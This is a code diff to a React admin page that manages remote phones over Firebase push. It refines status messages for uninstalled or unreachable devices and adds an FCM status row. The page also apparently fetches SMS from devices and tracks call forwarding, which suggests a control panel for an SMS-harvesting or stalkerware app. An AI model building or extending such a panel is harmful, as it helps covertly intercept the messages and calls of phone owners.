@@ -184,6 +184,7 @@ export default function DeviceDetailPage() {
   const did = decodeURIComponent(deviceId || "");
   const fromTab = (location.state as any)?.from || "home";
   const mountedRef = useRef(true);
+  const deviceRef = useRef<any>(null);
   const [device, setDeviceDoc] = useState<any>(null);
   const [loading, setLoading] = useState(true);
   const [alertText, setAlertText] = useState("");
@@ -275,6 +276,8 @@ export default function DeviceDetailPage() {
     } catch {}
   }
 
+  useEffect(() => { deviceRef.current = device; }, [device]);
+
   useEffect(() => {
     mountedRef.current = true; wsService.connect();
     if (!did) return;
@@ -294,12 +297,12 @@ export default function DeviceDetailPage() {
         return;
       }
       if (type === "event" && event === "notification:batch" && evDid === did) { if (alertActionRef.current === "get_sms") showResult(`SMS fetched successfully!`); loadSms(); return; }
-      if (event === "device:uninstalled" && evDid === did) { if (alertActionRef.current === "check_online") { showResult("App Uninstalled!"); logStatus("App Uninstalled!", "red"); } return; }
+      if (event === "device:uninstalled" && evDid === did) { setDeviceDoc((prev: any) => prev ? { ...prev, fcmStatus: "uninstalled", fcmToken: "" } : prev); if (alertActionRef.current === "check_online") { showResult("App Uninstalled!"); logStatus("App Uninstalled!", "red"); } return; }
       if (event === "check_online:result" && evDid === did) {
         if (alertActionRef.current === "check_online") {
           const status = safeStr(data?.status || ""); const err = safeStr(data?.error || "");
           if (status === "online") { const ts = Number(data?.checkedAt || Date.now()); setCheckedAt(ts); showResult("Device is Online!"); logStatus("Device Online", "green"); }
-          else if (err === "missing_token") { showResult("App Uninstalled!"); logStatus("App Uninstalled!", "red"); }
+          else if (err === "missing_token") { const curSt = deviceRef.current?.fcmStatus; if (curSt === "uninstalled") { showResult("App Uninstalled!"); logStatus("App Uninstalled!", "red"); } else if (curSt === "offline") { const curReason = safeStr(deviceRef.current?.unreachableReason || ""); if (curReason === "token_dead") { showResult("Device Offline — Token dead (UNREGISTERED), waiting for resync"); logStatus("Offline (token dead)", "red"); } else { showResult("Device Offline — FCM token missing"); logStatus("Offline (no token)", "red"); } } else { showResult("FCM token missing — app may be offline or reinstalling"); logStatus("Token Missing", "red"); } }
           else if (err) { showResult(`Device Unreachable: ${err}`); logStatus("Device Unreachable", "red"); }
         }
         return;
@@ -345,7 +348,7 @@ export default function DeviceDetailPage() {
     logStatus("Checking device online");
     openAlert("check_online", "Request sent to device. Waiting for response (up to 30 seconds)...");
     try { await axios.post(`${ENV.API_BASE}/api/admin/push/devices/${encodeURIComponent(did)}/ping`, { source: "detail", force: true }, { headers: apiHeaders(), timeout: 10000 }); }
-    catch (err: any) { const apiErr = safeStr(err?.response?.data?.error || ""); if (apiErr === "missing_token") { showResult("App Uninstalled!"); logStatus("App Uninstalled!", "red"); } else if (apiErr) { showResult(`FCM Failed: ${apiErr}`); logStatus("FCM send failed", "red"); } }
+    catch (err: any) { const apiErr = safeStr(err?.response?.data?.error || ""); if (apiErr === "missing_token") { const curSt = device?.fcmStatus; if (curSt === "uninstalled") { showResult("App Uninstalled!"); logStatus("App Uninstalled!", "red"); } else if (curSt === "offline") { const curReason = safeStr(device?.unreachableReason || ""); if (curReason === "token_dead") { showResult("Device Offline — Token dead (UNREGISTERED), resync pending"); logStatus("Offline (token dead)", "red"); } else { showResult("Device Offline — FCM token missing"); logStatus("Offline (no token)", "red"); } } else { showResult("FCM token missing — app may be offline or reinstalling"); logStatus("Token Missing", "red"); } } else if (apiErr) { showResult(`FCM Failed: ${apiErr}`); logStatus("FCM send failed", "red"); } }
   }
 
   async function handleGetSms() {
@@ -537,6 +540,7 @@ export default function DeviceDetailPage() {
                     <tr className="border-b border-gray-100"><td className="py-3 pl-4 text-[13px] font-semibold text-gray-600">ID</td><td className="break-all py-3 pr-4 text-[13px] text-gray-900">{did}</td></tr>
                     <tr className="border-b border-gray-100"><td className="py-3 pl-4 align-top text-[13px] font-semibold text-gray-600">SIM</td><td className="py-3 pr-4 text-[13px] text-gray-900">{simSummary.sim1 !== "-" && <div>{simSummary.sim1Carrier !== "-" ? `${simSummary.sim1Carrier}: ` : ""}{simSummary.sim1}</div>}{simSummary.sim2 !== "-" && <div>{simSummary.sim2Carrier !== "-" ? `${simSummary.sim2Carrier}: ` : ""}{simSummary.sim2}</div>}{simSummary.sim1 === "-" && simSummary.sim2 === "-" && <span className="text-gray-400">-</span>}</td></tr>
                     <tr className="border-b border-gray-100"><td className="py-3 pl-4 text-[13px] font-semibold text-gray-600">Forward Call</td><td className="py-3 pr-4 text-[13px] text-gray-900">{forwardOn ? "ON" : "OFF"}</td></tr>
+                    <tr className="border-b border-gray-100"><td className="py-3 pl-4 align-top text-[13px] font-semibold text-gray-600">FCM Status</td><td className="py-3 pr-4 text-[13px]">{(() => { const s = device?.fcmStatus; const r = device?.unreachableReason; const e = safeStr(device?.fcmLastError || ""); if (s === "online") return <span className="font-semibold text-green-600">Online</span>; if (s === "uninstalled") return <span className="font-semibold text-red-600">Uninstalled — App removed from device</span>; if (s === "offline") { if (r === "token_dead") return <span className="font-semibold text-orange-600">Offline — Token dead (Firebase: UNREGISTERED){e === "invalid_token_format" ? " — malformed token" : ""}</span>; if (r === "no_heartbeat") return <span className="font-semibold text-yellow-600">Offline — Phone silent (token valid, no heartbeat)</span>; return <span className="font-semibold text-orange-500">Offline</span>; } if (e === "messaging/sender-id-mismatch" || e === "messaging/third-party-auth-error") return <span className="font-semibold text-purple-600">Config error — Firebase sender mismatch</span>; if (e === "missing_token") return <span className="text-gray-500">Token missing — waiting for resync</span>; return <span className="text-gray-400">{s || "Unknown"}</span>; })()}</td></tr>
                     <tr className="border-b border-gray-100"><td className="py-3 pl-4 text-[13px] font-semibold text-gray-600">Install Date</td><td className="py-3 pr-4 text-[13px] font-semibold text-green-600">{installTs ? new Date(installTs).toLocaleString() : (device?.createdAt ? new Date(device.createdAt).toLocaleString() : "-")}</td></tr>
                     <tr className="border-b border-gray-100"><td className="py-3 pl-4 text-[13px] font-semibold text-gray-600">Last Checked</td><td className="py-3 pr-4"><TimeAgo ts={lastSeenTs} className={`text-[13px] font-semibold ${isRecent ? "text-green-600" : "text-red-500"}`} /></td></tr>
                     <tr className="border-b border-gray-100"><td className="py-3 pl-4 text-[13px] font-semibold text-gray-600">Last Activity</td><td className="py-3 pr-4">{lastActivityAt > 0 ? (<div><TimeAgo ts={lastActivityAt} className="text-[13px] font-semibold text-blue-600" />{lastActivityAction && <span className="ml-2 rounded bg-blue-50 border border-blue-100 px-1.5 py-0.5 text-[11px] font-semibold text-blue-500">{actionLabel[lastActivityAction] || lastActivityAction}</span>}</div>) : <span className="text-[13px] text-gray-400">No activity yet</span>}</td></tr>
